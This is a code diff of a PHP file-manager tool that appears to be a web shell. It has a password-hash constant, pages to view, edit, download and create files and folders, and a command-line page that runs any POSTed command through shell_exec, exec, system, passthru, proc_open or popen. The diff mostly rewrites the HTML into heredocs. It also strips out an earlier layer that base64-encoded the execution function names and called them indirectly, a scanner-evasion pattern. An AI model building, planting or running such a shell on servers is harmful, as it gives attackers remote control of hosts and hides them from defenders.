@@ -4,7 +4,6 @@ const VERSION = '3.0.0';
 const THEME = 'dark'; // 'dark' or 'light'
 const PASSWORD_HASH = '$2y$10$TfYHopECKw3K0fXuZvDZdOWWIbZVUg7C2QlO0Cf0/a0OruM3l4iR2';
 
-// Buffer for storing alerts to display later
 $alertMessages = [];
 
 function encryptPath(string $path): string
@@ -233,33 +232,58 @@ function viewFile(string $file): void
     $dirEnc = encryptPath(dirname($file));
     $name = htmlspecialchars(basename($file));
     $path = htmlspecialchars($file);
+    $size = formatSize(filesize($file));
+    $perms = getPerms($file);
+    $modified = date("Y-m-d H:i:s", filemtime($file));
+
     $btnPrimary = 'flex items-center px-4 py-2.5 bg-primary text-on-primary rounded-xl hover:bg-primary-hover transition-colors shadow-sm font-medium';
     $btnSecondary = 'flex items-center px-4 py-2.5 bg-surface-container-high text-on-surface rounded-xl hover:bg-surface-container-highest transition-colors shadow-sm font-medium';
 
-    echo '<div class="max-w-6xl mx-auto"><div class="bg-surface rounded-2xl shadow-sm border border-outline-variant overflow-hidden">';
+    echo <<<HTML
+<div class="max-w-6xl mx-auto">
+    <div class="bg-surface rounded-2xl shadow-sm border border-outline-variant overflow-hidden">
+        <div class="px-4 sm:px-6 py-4 border-b border-outline-variant bg-surface-container">
+            <h2 class="text-lg sm:text-xl font-bold text-on-surface flex items-center">
+                <div class="p-2 bg-surface rounded-xl shadow-sm mr-3">
+                    <svg class="h-5 w-5 sm:h-6 sm:w-6 text-primary" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"></path>
+                    </svg>
+                </div>
+                <span class="truncate">$name</span>
+            </h2>
+        </div>
 
-    // Header
-    echo '<div class="px-4 sm:px-6 py-4 border-b border-outline-variant bg-surface-container">';
-    echo '<h2 class="text-lg sm:text-xl font-bold text-on-surface flex items-center">';
-    echo '<div class="p-2 bg-surface rounded-xl shadow-sm mr-3"><svg class="h-5 w-5 sm:h-6 sm:w-6 text-primary" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"/></svg></div>';
-    echo "<span class=\"truncate\">$name</span></h2></div>";
+        <div class="px-4 sm:px-6 py-3 bg-surface-container-low border-b border-outline-variant">
+            <div class="text-on-surface-variant font-mono text-xs break-all mb-2">$path</div>
+            <div class="flex flex-wrap items-center gap-x-4 gap-y-1 text-xs text-on-surface-variant">
+                <span>$size</span><span>$perms</span><span>$modified</span>
+            </div>
+        </div>
 
-    // File info
-    echo '<div class="px-4 sm:px-6 py-3 bg-surface-container-low border-b border-outline-variant">';
-    echo "<div class=\"text-on-surface-variant font-mono text-xs break-all mb-2\">$path</div>";
-    echo '<div class="flex flex-wrap items-center gap-x-4 gap-y-1 text-xs text-on-surface-variant">';
-    echo '<span>' . formatSize(filesize($file)) . '</span><span>' . getPerms($file) . '</span><span>' . date("Y-m-d H:i:s", filemtime($file)) . '</span>';
-    echo '</div></div>';
+        <div class="p-4 sm:p-6">
+            <pre class="bg-surface-container-highest text-on-surface p-4 rounded-xl overflow-auto max-h-[50vh] sm:max-h-[60vh] font-mono text-xs sm:text-sm leading-relaxed scrollbar-thin">$content</pre>
+        </div>
 
-    // Content
-    echo "<div class=\"p-4 sm:p-6\"><pre class=\"bg-surface-container-highest text-on-surface p-4 rounded-xl overflow-auto max-h-[50vh] sm:max-h-[60vh] font-mono text-xs sm:text-sm leading-relaxed scrollbar-thin\">$content</pre></div>";
-
-    // Actions
-    echo '<div class="px-4 sm:px-6 py-4 bg-surface-container border-t border-outline-variant flex flex-wrap gap-2">';
-    echo "<a href=\"?action=edit&file=$enc\" class=\"$btnPrimary\"><svg class=\"h-5 w-5 mr-2\" fill=\"none\" stroke=\"currentColor\" viewBox=\"0 0 24 24\"><path stroke-linecap=\"round\" stroke-linejoin=\"round\" stroke-width=\"2\" d=\"M11 5H6a2 2 0 00-2 2v11a2 2 0 002 2h11a2 2 0 002-2v-5m-1.414-9.414a2 2 0 112.828 2.828L11.828 15H9v-2.828l8.586-8.586z\"/></svg>Edit</a>";
-    echo "<a href=\"?download=$enc\" class=\"$btnPrimary\"><svg class=\"h-5 w-5 mr-2\" fill=\"none\" stroke=\"currentColor\" viewBox=\"0 0 24 24\"><path stroke-linecap=\"round\" stroke-linejoin=\"round\" stroke-width=\"2\" d=\"M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4\"/></svg>Download</a>";
-    echo "<a href=\"?cd=$dirEnc\" class=\"$btnSecondary\"><svg class=\"h-5 w-5 mr-2\" fill=\"none\" stroke=\"currentColor\" viewBox=\"0 0 24 24\"><path stroke-linecap=\"round\" stroke-linejoin=\"round\" stroke-width=\"2\" d=\"M11 15l-3-3m0 0l3-3m-3 3h8M3 12a9 9 0 1118 0 9 9 0 01-18 0z\"/></svg>Back</a>";
-    echo '</div></div></div>';
+        <div class="px-4 sm:px-6 py-4 bg-surface-container border-t border-outline-variant flex flex-wrap gap-2">
+            <a href="?action=edit&file=$enc" class="$btnPrimary">
+                <svg class="h-5 w-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M11 5H6a2 2 0 00-2 2v11a2 2 0 002 2h11a2 2 0 002-2v-5m-1.414-9.414a2 2 0 112.828 2.828L11.828 15H9v-2.828l8.586-8.586z"></path>
+                </svg>Edit
+            </a>
+            <a href="?download=$enc" class="$btnPrimary">
+                <svg class="h-5 w-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4"></path>
+                </svg>Download
+            </a>
+            <a href="?cd=$dirEnc" class="$btnSecondary">
+                <svg class="h-5 w-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M11 15l-3-3m0 0l3-3m-3 3h8M3 12a9 9 0 1118 0 9 9 0 01-18 0z"></path>
+                </svg>Back
+            </a>
+        </div>
+    </div>
+</div>
+HTML;
 }
 
 function downloadFile(string $file): void
@@ -297,22 +321,41 @@ function editFile(string $file): void
     $btnPrimary = 'flex items-center px-4 py-2.5 bg-primary text-on-primary rounded-xl hover:bg-primary-hover transition-colors shadow-sm font-medium';
     $btnSecondary = 'flex items-center px-4 py-2.5 bg-surface-container-high text-on-surface rounded-xl hover:bg-surface-container-highest transition-colors shadow-sm font-medium';
 
-    echo '<div class="max-w-6xl mx-auto"><div class="bg-surface rounded-2xl shadow-sm border border-outline-variant overflow-hidden">';
+    echo <<<HTML
+<div class="max-w-6xl mx-auto">
+    <div class="bg-surface rounded-2xl shadow-sm border border-outline-variant overflow-hidden">
+        <div class="px-4 sm:px-6 py-4 border-b border-outline-variant bg-surface-container">
+            <h2 class="text-lg sm:text-xl font-bold text-on-surface flex items-center">
+                <div class="p-2 bg-surface rounded-xl shadow-sm mr-3">
+                    <svg class="h-5 w-5 sm:h-6 sm:w-6 text-primary" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M11 5H6a2 2 0 00-2 2v11a2 2 0 002 2h11a2 2 0 002-2v-5m-1.414-9.414a2 2 0 112.828 2.828L11.828 15H9v-2.828l8.586-8.586z"></path>
+                    </svg>
+                </div>
+                <span class="truncate">Editing: $name</span>
+            </h2>
+        </div>
 
-    // Header
-    echo '<div class="px-4 sm:px-6 py-4 border-b border-outline-variant bg-surface-container">';
-    echo '<h2 class="text-lg sm:text-xl font-bold text-on-surface flex items-center">';
-    echo '<div class="p-2 bg-surface rounded-xl shadow-sm mr-3"><svg class="h-5 w-5 sm:h-6 sm:w-6 text-primary" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M11 5H6a2 2 0 00-2 2v11a2 2 0 002 2h11a2 2 0 002-2v-5m-1.414-9.414a2 2 0 112.828 2.828L11.828 15H9v-2.828l8.586-8.586z"/></svg></div>';
-    echo "<span class=\"truncate\">Editing: $name</span></h2></div>";
+        <form method="post">
+            <div class="p-4 sm:p-6">
+                <textarea name="content" rows="20" class="w-full p-4 bg-surface-container-highest text-on-surface border-0 rounded-xl font-mono text-xs sm:text-sm leading-relaxed focus:outline-none focus:ring-2 focus:ring-primary resize-y" style="min-height: 300px;">$content</textarea>
+            </div>
 
-    echo '<form method="post">';
-    echo "<div class=\"p-4 sm:p-6\"><textarea name=\"content\" rows=\"20\" class=\"w-full p-4 bg-surface-container-highest text-on-surface border-0 rounded-xl font-mono text-xs sm:text-sm leading-relaxed focus:outline-none focus:ring-2 focus:ring-primary resize-y\" style=\"min-height: 300px;\">$content</textarea></div>";
-
-    // Actions
-    echo '<div class="px-4 sm:px-6 py-4 bg-surface-container border-t border-outline-variant flex flex-wrap gap-2">';
-    echo "<button type=\"submit\" class=\"$btnPrimary\"><svg class=\"h-5 w-5 mr-2\" fill=\"none\" stroke=\"currentColor\" viewBox=\"0 0 24 24\"><path stroke-linecap=\"round\" stroke-linejoin=\"round\" stroke-width=\"2\" d=\"M5 13l4 4L19 7\"/></svg>Save Changes</button>";
-    echo "<a href=\"?cd=$dirEnc\" class=\"$btnSecondary\"><svg class=\"h-5 w-5 mr-2\" fill=\"none\" stroke=\"currentColor\" viewBox=\"0 0 24 24\"><path stroke-linecap=\"round\" stroke-linejoin=\"round\" stroke-width=\"2\" d=\"M6 18L18 6M6 6l12 12\"/></svg>Cancel</a>";
-    echo '</div></form></div></div>';
+            <div class="px-4 sm:px-6 py-4 bg-surface-container border-t border-outline-variant flex flex-wrap gap-2">
+                <button type="submit" class="$btnPrimary">
+                    <svg class="h-5 w-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path>
+                    </svg>Save Changes
+                </button>
+                <a href="?cd=$dirEnc" class="$btnSecondary">
+                    <svg class="h-5 w-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path>
+                    </svg>Cancel
+                </a>
+            </div>
+        </form>
+    </div>
+</div>
+HTML;
 }
 
 function newFile(string $dir): void
@@ -339,59 +382,60 @@ function newFile(string $dir): void
 
 function displayNewFileForm(string $dir): void
 {
-    echo '<div class="max-w-4xl mx-auto">';
-    echo '<div class="bg-surface rounded-2xl shadow-sm border border-outline-variant overflow-hidden">';
+    $dirEsc = htmlspecialchars($dir);
+    $dirEnc = encryptPath($dir);
 
-    // Header
-    echo '<div class="px-4 sm:px-6 py-4 border-b border-outline-variant bg-surface-container">';
-    echo '<h2 class="text-lg sm:text-xl font-bold text-on-surface flex items-center">';
-    echo '<div class="p-2 bg-surface rounded-xl shadow-sm mr-3">';
-    echo '<svg class="h-5 w-5 sm:h-6 sm:w-6 text-primary" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v3m0 0v3m0-3h3m-3 0H9m12 0a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>';
-    echo '</div>';
-    echo 'Create New File';
-    echo '</h2>';
-    echo '</div>';
+    echo <<<HTML
+<div class="max-w-4xl mx-auto">
+    <div class="bg-surface rounded-2xl shadow-sm border border-outline-variant overflow-hidden">
+        <div class="px-4 sm:px-6 py-4 border-b border-outline-variant bg-surface-container">
+            <h2 class="text-lg sm:text-xl font-bold text-on-surface flex items-center">
+                <div class="p-2 bg-surface rounded-xl shadow-sm mr-3">
+                    <svg class="h-5 w-5 sm:h-6 sm:w-6 text-primary" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v3m0 0v3m0-3h3m-3 0H9m12 0a9 9 0 11-18 0 9 9 0 0118 0z"></path>
+                    </svg>
+                </div>
+                Create New File
+            </h2>
+        </div>
 
-    echo '<form method="post">';
+        <form method="post">
+            <div class="p-4 sm:p-6 space-y-4">
+                <div class="p-3 bg-surface-container rounded-xl border border-outline-variant">
+                    <span class="text-sm text-on-surface-variant">Location:</span>
+                    <span class="ml-2 text-sm font-mono text-on-surface break-all">$dirEsc</span>
+                </div>
 
-    echo '<div class="p-4 sm:p-6 space-y-4">';
+                <div>
+                    <label class="block text-sm font-medium text-on-surface mb-2">Filename</label>
+                    <input type="text" name="filename" class="w-full px-4 py-2.5 bg-surface border border-outline-variant rounded-xl focus:outline-none focus:ring-2 focus:ring-primary text-on-surface placeholder-on-surface-variant transition-shadow" placeholder="Enter filename (e.g., script.php)" required>
+                </div>
 
-    // Location
-    echo '<div class="p-3 bg-surface-container rounded-xl border border-outline-variant">';
-    echo '<span class="text-sm text-on-surface-variant">Location:</span>';
-    echo '<span class="ml-2 text-sm font-mono text-on-surface break-all">' . htmlspecialchars($dir) . '</span>';
-    echo '</div>';
+                <div>
+                    <label class="block text-sm font-medium text-on-surface mb-2">Content</label>
+                    <textarea name="content" rows="12" class="w-full p-4 bg-surface-container-highest text-on-surface border-0 rounded-xl font-mono text-xs sm:text-sm leading-relaxed focus:outline-none focus:ring-2 focus:ring-primary resize-y" style="min-height: 250px;" placeholder="Enter file content here..."></textarea>
+                </div>
+            </div>
 
-    // Filename
-    echo '<div>';
-    echo '<label class="block text-sm font-medium text-on-surface mb-2">Filename</label>';
-    echo '<input type="text" name="filename" class="w-full px-4 py-2.5 bg-surface border border-outline-variant rounded-xl focus:outline-none focus:ring-2 focus:ring-primary text-on-surface placeholder-on-surface-variant transition-shadow" placeholder="Enter filename (e.g., script.php)" required>';
-    echo '</div>';
+            <div class="px-4 sm:px-6 py-4 bg-surface-container border-t border-outline-variant flex flex-wrap gap-2">
+                <button type="submit" class="flex items-center px-4 py-2.5 bg-primary text-on-primary rounded-xl hover:bg-primary-hover transition-colors shadow-sm font-medium">
+                    <svg class="h-5 w-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path>
+                    </svg>
+                    Create File
+                </button>
 
-    // Content
-    echo '<div>';
-    echo '<label class="block text-sm font-medium text-on-surface mb-2">Content</label>';
-    echo '<textarea name="content" rows="12" class="w-full p-4 bg-surface-container-highest text-on-surface border-0 rounded-xl font-mono text-xs sm:text-sm leading-relaxed focus:outline-none focus:ring-2 focus:ring-primary resize-y" style="min-height: 250px;" placeholder="Enter file content here..."></textarea>';
-    echo '</div>';
-
-    echo '</div>';
-
-    // Actions
-    echo '<div class="px-4 sm:px-6 py-4 bg-surface-container border-t border-outline-variant flex flex-wrap gap-2">';
-    echo '<button type="submit" class="flex items-center px-4 py-2.5 bg-primary text-on-primary rounded-xl hover:bg-primary-hover transition-colors shadow-sm font-medium">';
-    echo '<svg class="h-5 w-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path></svg>';
-    echo 'Create File';
-    echo '</button>';
-
-    echo '<a href="?cd=' . encryptPath($dir) . '" class="flex items-center px-4 py-2.5 bg-surface-container-high text-on-surface rounded-xl hover:bg-surface-container-highest transition-colors shadow-sm font-medium">';
-    echo '<svg class="h-5 w-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path></svg>';
-    echo 'Cancel';
-    echo '</a>';
-    echo '</div>';
-
-    echo '</form>';
-    echo '</div>';
-    echo '</div>';
+                <a href="?cd=$dirEnc" class="flex items-center px-4 py-2.5 bg-surface-container-high text-on-surface rounded-xl hover:bg-surface-container-highest transition-colors shadow-sm font-medium">
+                    <svg class="h-5 w-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path>
+                    </svg>
+                    Cancel
+                </a>
+            </div>
+        </form>
+    </div>
+</div>
+HTML;
 }
 
 function newFolder(string $dir): void
@@ -406,7 +450,6 @@ function newFolder(string $dir): void
         $foldername = $dir . DIRECTORY_SEPARATOR . $_POST['foldername'];
         mkdir($foldername, 0755);
 
-        // Reset POST data and show file manager
         $_POST = array();
         showAlert("Folder created successfully!", "success");
         fileManager($dir);
@@ -418,200 +461,204 @@ function newFolder(string $dir): void
 
 function displayNewFolderForm(string $dir): void
 {
-    echo '<div class="max-w-lg mx-auto">';
-    echo '<div class="bg-surface rounded-2xl shadow-sm border border-outline-variant overflow-hidden">';
+    $dirEsc = htmlspecialchars($dir);
+    $dirEnc = encryptPath($dir);
 
-    // Header
-    echo '<div class="px-4 sm:px-6 py-4 border-b border-outline-variant bg-surface-container">';
-    echo '<h2 class="text-lg sm:text-xl font-bold text-on-surface flex items-center">';
-    echo '<div class="p-2 bg-surface rounded-xl shadow-sm mr-3">';
-    echo '<svg class="h-5 w-5 sm:h-6 sm:w-6 text-primary" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 13h6m-3-3v6m-9-6h.01M19 13h.01M19 19h.01M5 19h.01M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path></svg>';
-    echo '</div>';
-    echo 'Create New Folder';
-    echo '</h2>';
-    echo '</div>';
+    echo <<<HTML
+<div class="max-w-lg mx-auto">
+    <div class="bg-surface rounded-2xl shadow-sm border border-outline-variant overflow-hidden">
+        <div class="px-4 sm:px-6 py-4 border-b border-outline-variant bg-surface-container">
+            <h2 class="text-lg sm:text-xl font-bold text-on-surface flex items-center">
+                <div class="p-2 bg-surface rounded-xl shadow-sm mr-3">
+                    <svg class="h-5 w-5 sm:h-6 sm:w-6 text-primary" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 13h6m-3-3v6m-9-6h.01M19 13h.01M19 19h.01M5 19h.01M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path>
+                    </svg>
+                </div>
+                Create New Folder
+            </h2>
+        </div>
 
-    echo '<form method="post">';
+        <form method="post">
+            <div class="p-4 sm:p-6 space-y-4">
+                <div class="p-3 bg-surface-container rounded-xl border border-outline-variant">
+                    <span class="text-sm text-on-surface-variant">Location:</span>
+                    <span class="ml-2 text-sm font-mono text-on-surface break-all">$dirEsc</span>
+                </div>
 
-    echo '<div class="p-4 sm:p-6 space-y-4">';
+                <div>
+                    <label class="block text-sm font-medium text-on-surface mb-2">Folder Name</label>
+                    <input type="text" name="foldername" class="w-full px-4 py-2.5 bg-surface border border-outline-variant rounded-xl focus:outline-none focus:ring-2 focus:ring-primary text-on-surface placeholder-on-surface-variant transition-shadow" placeholder="Enter folder name" required>
+                </div>
+            </div>
 
-    // Location
-    echo '<div class="p-3 bg-surface-container rounded-xl border border-outline-variant">';
-    echo '<span class="text-sm text-on-surface-variant">Location:</span>';
-    echo '<span class="ml-2 text-sm font-mono text-on-surface break-all">' . htmlspecialchars($dir) . '</span>';
-    echo '</div>';
+            <div class="px-4 sm:px-6 py-4 bg-surface-container border-t border-outline-variant flex flex-wrap gap-2">
+                <button type="submit" class="flex items-center px-4 py-2.5 bg-primary text-on-primary rounded-xl hover:bg-primary-hover transition-colors shadow-sm font-medium">
+                    <svg class="h-5 w-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path>
+                    </svg>
+                    Create Folder
+                </button>
 
-    // Folder Name
-    echo '<div>';
-    echo '<label class="block text-sm font-medium text-on-surface mb-2">Folder Name</label>';
-    echo '<input type="text" name="foldername" class="w-full px-4 py-2.5 bg-surface border border-outline-variant rounded-xl focus:outline-none focus:ring-2 focus:ring-primary text-on-surface placeholder-on-surface-variant transition-shadow" placeholder="Enter folder name" required>';
-    echo '</div>';
-
-    echo '</div>';
-
-    // Actions
-    echo '<div class="px-4 sm:px-6 py-4 bg-surface-container border-t border-outline-variant flex flex-wrap gap-2">';
-    echo '<button type="submit" class="flex items-center px-4 py-2.5 bg-primary text-on-primary rounded-xl hover:bg-primary-hover transition-colors shadow-sm font-medium">';
-    echo '<svg class="h-5 w-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path></svg>';
-    echo 'Create Folder';
-    echo '</button>';
-
-    echo '<a href="?cd=' . encryptPath($dir) . '" class="flex items-center px-4 py-2.5 bg-surface-container-high text-on-surface rounded-xl hover:bg-surface-container-highest transition-colors shadow-sm font-medium">';
-    echo '<svg class="h-5 w-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path></svg>';
-    echo 'Cancel';
-    echo '</a>';
-    echo '</div>';
-
-    echo '</form>';
-    echo '</div>';
-    echo '</div>';
+                <a href="?cd=$dirEnc" class="flex items-center px-4 py-2.5 bg-surface-container-high text-on-surface rounded-xl hover:bg-surface-container-highest transition-colors shadow-sm font-medium">
+                    <svg class="h-5 w-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path>
+                    </svg>
+                    Cancel
+                </a>
+            </div>
+        </form>
+    </div>
+</div>
+HTML;
 }
 
 function getFunctionalCmd(string $cmd): string
 {
-    $funcs = ['shell_exec', 'exec', 'system', 'passthru', 'proc_open', 'popen'];
-    $obfuscated = base64_encode(serialize($funcs));
-    $deobfuscate = function ($x) {
-        return unserialize(base64_decode($x));
-    };
+    $executors = ['shell_exec', 'exec', 'system', 'passthru', 'proc_open', 'popen'];
 
-    foreach ($deobfuscate($obfuscated) as $func) {
-        if (function_exists($func)) {
-            return obfuscatedExecution($func, $cmd);
+    foreach ($executors as $func) {
+        if (!function_exists($func)) {
+            continue;
+        }
+
+        switch ($func) {
+            case 'shell_exec':
+                $output = $func($cmd);
+                return $output !== null ? $output : 'Failed to execute command.';
+
+            case 'exec':
+                $output = [];
+                $func($cmd, $output);
+                return implode("\n", $output);
+
+            case 'system':
+            case 'passthru':
+                ob_start();
+                $func($cmd);
+                return ob_get_clean();
+
+            case 'proc_open':
+                $spec = [
+                    0 => ["pipe", "r"],
+                    1 => ["pipe", "w"],
+                    2 => ["pipe", "w"]
+                ];
+                $proc = proc_open($cmd, $spec, $pipes);
+                if (is_resource($proc)) {
+                    fclose($pipes[0]);
+                    $out = stream_get_contents($pipes[1]);
+                    $err = stream_get_contents($pipes[2]);
+                    fclose($pipes[1]);
+                    fclose($pipes[2]);
+                    proc_close($proc);
+                    return $err ? "Error: $err" : $out;
+                }
+                return "Failed to execute command.";
+
+            case 'popen':
+                $handle = popen($cmd, 'r');
+                if ($handle) {
+                    $output = stream_get_contents($handle);
+                    pclose($handle);
+                    return $output;
+                }
+                return "Failed to execute command.";
         }
     }
 
-    return "No available function to execute command.";
-}
-
-function obfuscatedExecution(string $func, string $cmd): string
-{
-    $encoded = base64_encode($cmd);
-    $decoded = base64_decode($encoded);
-
-    switch ($func) {
-        case 'shell_exec':
-            $output = call_user_func($func, $decoded);
-            return $output !== null ? $output : 'Command failed or returned no output';
-        case 'exec':
-            $output = [];
-            call_user_func($func, $decoded, $output);
-            return implode("\n", $output);
-        case 'system':
-        case 'passthru':
-            ob_start();
-            call_user_func($func, $decoded);
-            return ob_get_clean();
-        case 'proc_open':
-            return executeWithProc_open($decoded);
-        case 'popen':
-            return executeWithPopen($decoded);
-        default:
-            return "Unknown function: $func";
-    }
-}
-
-function executeWithProc_open(string $cmd): string
-{
-    $spec = [0 => ["pipe", "r"], 1 => ["pipe", "w"], 2 => ["pipe", "w"]];
-    $proc = call_user_func('proc_open', $cmd, $spec, $pipes);
-    if (is_resource($proc)) {
-        fclose($pipes[0]);
-        $out = stream_get_contents($pipes[1]);
-        $err = stream_get_contents($pipes[2]);
-        array_map('fclose', array_slice($pipes, 1));
-        proc_close($proc);
-        return $err ? "Error: $err" : $out;
-    }
-    return "Failed to execute command using proc_open.";
-}
-
-function executeWithPopen(string $cmd): string
-{
-    $handle = call_user_func('popen', $cmd, 'r');
-    if ($handle) {
-        $output = stream_get_contents($handle);
-        pclose($handle);
-        return $output;
-    }
-    return "Failed to execute command using popen.";
+    return "Failed to execute command.";
 }
 
 function commandLine(string $dir): void
 {
     $output = '';
+    $dirEnc = encryptPath($dir);
+
     if (isset($_POST['command'])) {
         $command = $_POST['command'];
         chdir($dir);
-
         $output = getFunctionalCmd($command);
     }
 
-    echo '<div class="max-w-6xl mx-auto">';
-    echo '<div class="bg-surface rounded-2xl shadow-sm border border-outline-variant overflow-hidden">';
+    $workingDirEsc = htmlspecialchars($dir);
 
-    // Header
-    echo '<div class="px-4 sm:px-6 py-4 border-b border-outline-variant bg-surface-container">';
-    echo '<h2 class="text-lg sm:text-xl font-bold text-on-surface flex items-center">';
-    echo '<div class="p-2 bg-surface rounded-xl shadow-sm mr-3">';
-    echo '<svg class="h-5 w-5 sm:h-6 sm:w-6 text-primary" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 9l3 3-3 3m5 0h3M5 20h14a2 2 0 002-2V6a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z"></path></svg>';
-    echo '</div>';
-    echo 'Command Line';
-    echo '</h2>';
-    echo '</div>';
+    echo <<<HTML
+<div class="max-w-6xl mx-auto">
+    <div class="bg-surface rounded-2xl shadow-sm border border-outline-variant overflow-hidden">
+        <div class="px-4 sm:px-6 py-4 border-b border-outline-variant bg-surface-container">
+            <h2 class="text-lg sm:text-xl font-bold text-on-surface flex items-center">
+                <div class="p-2 bg-surface rounded-xl shadow-sm mr-3">
+                    <svg class="h-5 w-5 sm:h-6 sm:w-6 text-primary" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 9l3 3-3 3m5 0h3M5 20h14a2 2 0 002-2V6a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z"></path>
+                    </svg>
+                </div>
+                Command Line
+            </h2>
+        </div>
 
-    echo '<div class="p-4 sm:p-6">';
+        <div class="p-4 sm:p-6">
+            <div class="mb-4 p-3 bg-surface-container rounded-xl border border-outline-variant">
+                <span class="text-sm text-on-surface-variant">Working directory:</span>
+                <span class="ml-2 text-sm font-mono text-on-surface break-all">$workingDirEsc</span>
+            </div>
 
-    // Working directory
-    echo '<div class="mb-4 p-3 bg-surface-container rounded-xl border border-outline-variant">';
-    echo '<span class="text-sm text-on-surface-variant">Working directory:</span>';
-    echo '<span class="ml-2 text-sm font-mono text-on-surface break-all">' . htmlspecialchars($dir) . '</span>';
-    echo '</div>';
+            <form method="post" class="mb-4">
+                <div class="flex flex-col sm:flex-row gap-2">
+                    <div class="flex-1">
+                        <div class="relative">
+                            <div class="absolute inset-y-0 left-0 pl-4 flex items-center pointer-events-none">
+                                <span class="text-primary font-mono font-bold">$</span>
+                            </div>
+                            <input type="text" name="command" class="w-full pl-10 pr-4 py-3 bg-surface-container border border-outline-variant rounded-xl focus:outline-none focus:ring-2 focus:ring-primary text-on-surface placeholder-on-surface-variant transition-all font-mono text-sm" placeholder="Enter command (e.g., ls -la)" autocomplete="off">
+                        </div>
+                    </div>
 
-    // Command form
-    echo '<form method="post" class="mb-4">';
-    echo '<div class="flex flex-col sm:flex-row gap-2">';
-    echo '<div class="flex-1">';
-    echo '<div class="relative">';
-    echo '<div class="absolute inset-y-0 left-0 pl-4 flex items-center pointer-events-none">';
-    echo '<span class="text-primary font-mono font-bold">$</span>';
-    echo '</div>';
-    echo '<input type="text" name="command" class="w-full pl-10 pr-4 py-3 bg-surface-container border border-outline-variant rounded-xl focus:outline-none focus:ring-2 focus:ring-primary text-on-surface placeholder-on-surface-variant transition-all font-mono text-sm" placeholder="Enter command (e.g., ls -la)" autocomplete="off">';
-    echo '</div>';
-    echo '</div>';
+                    <button type="submit" class="flex items-center justify-center px-5 py-3 bg-primary text-on-primary rounded-xl hover:bg-primary-hover transition-colors shadow-sm font-medium whitespace-nowrap">
+                        <svg class="h-5 w-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z"></path>
+                        </svg>
+                        Execute
+                    </button>
+                </div>
+            </form>
 
